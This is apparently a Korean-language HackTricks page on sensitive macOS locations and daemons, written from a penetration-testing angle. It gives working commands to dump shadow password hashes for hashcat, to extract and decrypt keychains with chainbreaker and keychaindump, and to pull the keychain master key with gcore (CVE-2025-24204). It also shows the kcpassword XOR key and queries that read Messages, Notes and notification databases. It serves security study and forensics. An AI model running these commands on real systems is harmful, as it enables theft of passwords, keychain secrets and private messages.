# macOS 민감한 위치 및 흥미로운 데몬

{{#include ../../../banners/hacktricks-training.md}}


## 비밀번호

### Shadow Password

Shadow password는 **`/var/db/dslocal/nodes/Default/users/`**에 있는 plist 파일의 사용자 설정과 함께 저장됩니다.\
다음 한 줄 명령으로 **사용자에 관한 모든 정보**(해시 정보 포함)를 덤프할 수 있습니다:

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**이 스크립트와 같은 스크립트**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 스크립트**](https://github.com/octomagon/davegrohl.git)를 사용해 해시를 **hashcat** **형식**으로 변환할 수 있습니다.

모든 비서비스 계정의 자격 증명을 hashcat 형식 `-m 7100`(macOS PBKDF2-SHA512)으로 덤프하는 대체 원라이너:

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

사용자의 `ShadowHashData`를 얻는 또 다른 방법은 `dscl`을 사용하는 것입니다. `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Linux에서 복사한 ShadowHashData 변환

해당 속성을 Linux cracking host로 복사했다면 **16진수 바이트만**(`ShadowHashData:` 레이블은 제외) `shadowhash.hex`에 저장합니다. Ubuntu에서는 `libplist-utils`를 사용해 디코딩된 바이너리 plist를 macOS `plutil` 없이 읽을 수 있는 XML로 변환할 수 있습니다.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

XML에서 별도의 SRP verifier가 아니라 **`SALTED-SHA512-PBKDF2`**의 `iterations`, base64 `salt`, `entropy`를 사용합니다. `salt_b64`와 `entropy_b64`에 각각 해당 XML `<data>`의 내용을 넣습니다. 이를 hex로 디코딩하고 다음 형식의 한 줄을 구성합니다: `$ml$<iterations>$<salt_hex>$<entropy_hex>` (Hashcat mode `7100`). 이는 권한이 있는 상태에서 해시를 획득한 후 수행하는 오프라인 추측이며, 초기 접근이나 권한 상승 방법이 아닙니다.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

이 파일은 시스템이 **single-user mode**로 실행 중일 때만 **사용됩니다**(따라서 자주 사용되지는 않습니다).

### Keychain Dump

security 바이너리를 사용해 **암호를 복호화하여 덤프**하면, 사용자에게 이 작업을 허용할지 묻는 프롬프트가 여러 번 표시됩니다.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

최신 macOS에서 가장 흥미로운 backing store는 보통 **`~/Library/Keychains/login.keychain-db`**와 **`/Library/Keychains/System.keychain`**입니다. 이 파일들은 SQLite 기반이지만, 평문 접근은 여전히 **`securityd`**가 중개합니다. 따라서 원시 DB를 탈취해도 사용자의 비밀번호, `SystemKey` 또는 메모리에 있는 master key를 함께 복구하지 않는 한 주로 메타데이터와 암호화된 blob만 얻을 수 있습니다.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> 이 댓글 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면, 이 도구들은 Big Sur에서 더 이상 작동하지 않는 것으로 보입니다.

### Keychaindump 개요

macOS keychain에서 비밀번호를 추출하는 **keychaindump**라는 도구가 개발되었지만, [토론](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 나와 있듯이 Big Sur와 같은 최신 macOS 버전에서는 제한이 있습니다. **keychaindump**를 사용하려면 공격자가 접근 권한을 얻고 **root**로 권한을 상승해야 합니다. 이 도구는 편의를 위해 사용자가 로그인하면 keychain이 기본적으로 잠금 해제되어, 애플리케이션이 사용자에게 매번 비밀번호를 요구하지 않고도 keychain에 접근할 수 있다는 점을 이용합니다. 그러나 사용자가 매번 사용할 때마다 keychain을 잠그도록 설정한 경우 **keychaindump**는 효과가 없습니다.

**Keychaindump**는 Apple이 권한 부여 및 암호화 작업을 수행하는 데몬으로 설명한 **securityd**라는 특정 프로세스를 대상으로 합니다. 이 프로세스는 keychain에 접근하는 데 핵심적인 역할을 합니다. 추출 과정에서는 사용자의 로그인 비밀번호에서 파생된 **Master Key**를 찾습니다. 이 키는 keychain 파일을 읽는 데 필수적입니다. **Master Key**를 찾기 위해 **keychaindump**는 `vmmap` 명령을 사용해 **securityd**의 메모리 heap을 검색하고, `MALLOC_TINY`로 표시된 영역에서 키일 가능성이 있는 값을 찾습니다. 다음 명령을 사용해 이러한 메모리 위치를 확인합니다:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

잠재적인 마스터 키를 식별한 후, **keychaindump**는 힙을 검색해 마스터 키 후보를 나타내는 특정 패턴(`0x0000000000000018`)을 찾습니다. 이 키를 사용하려면 **keychaindump**의 소스 코드에 설명된 대로 디옵퍼스케이션을 비롯한 추가 단계가 필요합니다. 이 영역을 조사하는 분석가는 키체인을 복호화하는 데 필요한 핵심 데이터가 **securityd** 프로세스의 메모리에 저장된다는 점에 유의해야 합니다. **keychaindump**를 실행하는 명령어 예시는 다음과 같습니다.

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)는 macOS 키체인에서 다음 유형의 정보를 포렌식 무결성을 유지하며 추출할 수 있습니다.

- [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 cracking할 수 있는 해시된 키체인 password
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

키체인 잠금 해제 password, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)로 얻은 master key, 또는 SystemKey 같은 잠금 해제 파일이 있으면 Chainbreaker는 plaintext password도 제공합니다.

이러한 방법으로 키체인을 잠금 해제하지 않으면 Chainbreaker는 그 밖에 사용 가능한 모든 정보를 표시합니다.

#### **키체인 키 덤프**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **SystemKey로 암호가 포함된 키체인 키 Dump**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **keychain 키 덤프 (비밀번호 포함), hash cracking**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **메모리 덤프로 keychain 키(비밀번호 포함) 덤프하기**

[다음 단계](../index.html#dumping-memory-with-osxpmem)에 따라 **메모리 덤프**를 수행하세요.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **사용자 암호를 사용해 keychain 키 덤프하기(암호 포함)**

사용자의 암호를 알고 있다면 **사용자 소유의 keychain을 덤프하고 복호화**할 수 있습니다.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### `gcore` entitlement를 통한 Keychain master key 획득 (CVE-2025-24204)

macOS 15.0 (Sequoia)에는 **`com.apple.system-task-ports.read`** entitlement가 부여된 `/usr/bin/gcore`가 포함되어 있어, 모든 로컬 관리자(또는 악성 서명 앱)가 SIP/TCC가 적용된 상태에서도 **임의의 프로세스 메모리를 덤프**할 수 있었습니다. `securityd`를 덤프하면 **Keychain master key**가 평문으로 유출되어 사용자 암호 없이 `login.keychain-db`를 복호화할 수 있습니다.<sup>[[1]](#references)</sup>

**취약한 빌드(15.0–15.2)에서 빠르게 재현하기:**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
추출한 hex key를 Chainbreaker(`--key <hex>`)에 전달해 login keychain을 복호화합니다. Apple은 **macOS 15.3+**에서 entitlement를 제거했으므로, 패치되지 않은 Sequoia 빌드 또는 취약한 바이너리가 그대로 남아 있는 시스템에서만 작동합니다.

### kcpassword

**kcpassword** 파일에는 **사용자의 로그인 암호**가 저장되지만, 시스템 소유자가 **자동 로그인을 활성화한 경우에만** 해당합니다. 따라서 사용자는 암호를 묻는 메시지 없이 자동으로 로그인됩니다(보안성이 그리 높지는 않습니다).

암호는 **`/etc/kcpassword`** 파일에 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 키로 XOR 연산되어 저장됩니다. 사용자 암호가 키보다 길면 키가 반복해서 사용됩니다.\
따라서 [**이 스크립트**](https://gist.github.com/opshope/32f65875d45215c3677d) 같은 스크립트를 사용하면 암호를 쉽게 복구할 수 있습니다.

## 데이터베이스의 흥미로운 정보

### 메시지

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

**Sequoia** 이전에는 Notification Center 저장소를 보통 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**에서 찾을 수 있습니다. **Sequoia+**에서는 Apple이 이를 TCC로 보호되는 그룹 컨테이너 **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**로 옮겼습니다.

대부분의 흥미로운 정보는 **blob** 열에 저장되므로, 해당 내용을 추출해 사람이 읽을 수 있는 형태로 변환해야 합니다(`plutil -p -`, `strings` 또는 간단한 parser 사용). 빠른 triage 예시:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### 최근 개인정보 보호 문제(NotificationCenter DB)

- macOS **14.7–15.1**에서 Apple은 배너 내용을 적절히 redaction하지 않은 채 `db2/db` SQLite에 저장했습니다. **CVE-2024-44292/44293/40838/54504**를 악용하면 로컬 사용자가 DB를 열기만 해도 다른 사용자의 알림 텍스트를 읽을 수 있었습니다(TCC 프롬프트 없음).<sup>[[3]](#references)</sup>
- Apple은 최신 Sequoia 빌드에서 DB를 `group.com.apple.usernoted`로 옮기고 TCC로 보호해 이를 완화했습니다. 따라서 현재 시스템에서는 보통 해당 사용자 context 또는 TCC bypass가 있어야 읽을 수 있습니다.<sup>[[4]](#references)</sup>
- 레거시 endpoint에서 artefact를 보존하려면 업데이트하거나 재부팅하기 전에 `db`, `db-wal`, `db-shm` 파일을 함께 복사하세요.

### 참고 사항

사용자의 **메모**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다.

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

위의 one-liner가 너무 많은 잡음을 포함한다면, `ZICNOTEDATA.ZDATA`를 내보내고 gunzip으로 압축을 푼 다음 protobuf를 파싱하세요. SQLite에서 직접 `strings`를 실행하는 것보다 대체로 더 안정적입니다.

### Background Tasks / Login Items

**Ventura**부터 사용자가 승인한 로그인 항목과 여러 background task는 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** 및 버전이 지정된 시스템 캐시 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**와 같은 **BTM** 저장소에서 추적됩니다.

이 파일은 persistence, helper tool 및 일부 MDM 관리 background item을 빠르게 식별하는 데 유용합니다:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

지속성 측면과 BTM 내부 동작에 대해서는 [자동 시작 위치 페이지](../../macos-auto-start-locations.md#login-items)와 [Background Tasks Management 참고 자료](../macos-security-protections/README.md#background-tasks-management)를 확인하세요.

## Preferences

macOS 앱의 preferences는 **`$HOME/Library/Preferences`**에 있고, iOS에서는 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`에 있습니다.

macOS에서는 CLI 도구 **`defaults`**를 사용해 **Preferences 파일을 수정**할 수 있습니다.

**`/usr/sbin/cfprefsd`**는 XPC 서비스 `com.apple.cfprefsd.daemon`과 `com.apple.cfprefsd.agent`를 제공하며, preferences 수정 등의 작업을 수행하도록 호출할 수 있습니다.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` 파일에는 노드 속성에 적용되는 권한이 포함되어 있으며 SIP로 보호됩니다.\
이 파일은 UUID(uid가 아님)를 기준으로 특정 사용자에게 권한을 부여하므로, 해당 사용자가 `ShadowHashData`, `HeimdalSRPKey`, `KerberosKeys` 등의 민감한 정보에 접근할 수 있습니다:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## 시스템 알림

### Darwin 알림

알림을 담당하는 주요 데몬은 **`/usr/sbin/notifyd`**입니다. 알림을 받으려면 클라이언트가 `com.apple.system.notification_center` Mach 포트를 통해 등록해야 합니다(확인하려면 `sudo lsmp -p <pid notifyd>`를 실행하세요). 데몬은 `/etc/notify.conf` 파일로 구성할 수 있습니다.

알림 이름은 고유한 역방향 DNS 표기이며, 그중 하나로 알림을 보내면 해당 알림을 처리할 수 있다고 표시한 클라이언트가 이를 받습니다.

notifyd 프로세스에 SIGUSR2 신호를 보내고 생성된 파일 `/var/run/notifyd_<pid>.status`를 읽으면 현재 상태를 덤프하고 모든 이름을 확인할 수 있습니다.

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

주요 바이너리가 **`/usr/sbin/distnoted`**인 **Distributed Notification Center**는 알림을 보내는 또 다른 방법입니다. 일부 XPC 서비스를 노출하며 클라이언트를 확인하려고 몇 가지 검사를 수행합니다.

### Apple Push Notifications (APN)

이 경우 애플리케이션은 **topics**를 등록할 수 있습니다. 클라이언트는 **`apsd`**를 통해 Apple 서버에 접속하여 토큰을 생성합니다.\
그런 다음 provider도 토큰을 생성하고 Apple 서버에 접속하여 클라이언트에 메시지를 보낼 수 있습니다. 이 메시지는 **`apsd`**가 로컬에서 수신한 후 알림을 기다리는 애플리케이션에 전달합니다.

환경설정은 `/Library/Preferences/com.apple.apsd.plist`에 있습니다.

메시지의 로컬 데이터베이스는 macOS의 `/Library/Application\ Support/ApplePushService/aps.db`와 iOS의 `/var/mobile/Library/ApplePushService`에 있습니다. 이 데이터베이스에는 `incoming_messages`, `outgoing_messages`, `channel`의 3개 테이블이 있습니다.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

다음을 사용해 daemon 및 연결에 대한 정보도 확인할 수 있습니다:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## 사용자 알림

사용자가 화면에서 확인해야 하는 알림입니다.

- **`CFUserNotification`**: 이 API는 메시지가 표시된 팝업을 화면에 띄우는 방법을 제공합니다.
- **The Bulletin Board**: iOS에서 표시되며 사라진 후 알림 센터에 저장되는 배너입니다.
- **`NSUserNotificationCenter`**: macOS의 레거시 알림 센터 서비스입니다. 이전 릴리스에서는 데이터베이스가 일반적으로 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 있습니다. Sequoia 및 이후 버전에서는 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`로 이동했습니다.

## References

- [1] [HelpNetSecurity – macOS gcore entitlement를 통한 Keychain 마스터 키 추출 허용 (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain 데이터 보호](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Notification Center SQLite 정보 노출 (CVE-2024-44292 등)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple, macOS Sequoia의 Notification Center 데이터베이스 관련 개인정보 보호 우려에 대응](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOS Password Cracking](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat 예시 해시 – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
